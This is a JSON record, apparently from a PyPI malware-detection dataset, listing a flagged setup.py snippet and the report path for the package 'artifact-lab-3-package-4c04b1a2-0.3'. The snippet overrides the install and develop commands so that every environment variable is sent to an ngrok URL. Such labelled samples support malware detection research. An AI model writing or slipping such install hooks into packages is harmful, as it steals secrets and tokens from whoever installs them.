[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://5cecdbdb0328.ngrok.app/collect'\n    req = urllib.request.Request(url, data=encoded_data)\n    urllib.request.urlopen(req)\n\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()"
  },
  {
    "metadata": {
      "package_name": "artifact-lab-3-package-4c04b1a2-0.3",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/artifact-lab-3-package-4c04b1a2-0.3.txt"
    }
  }
]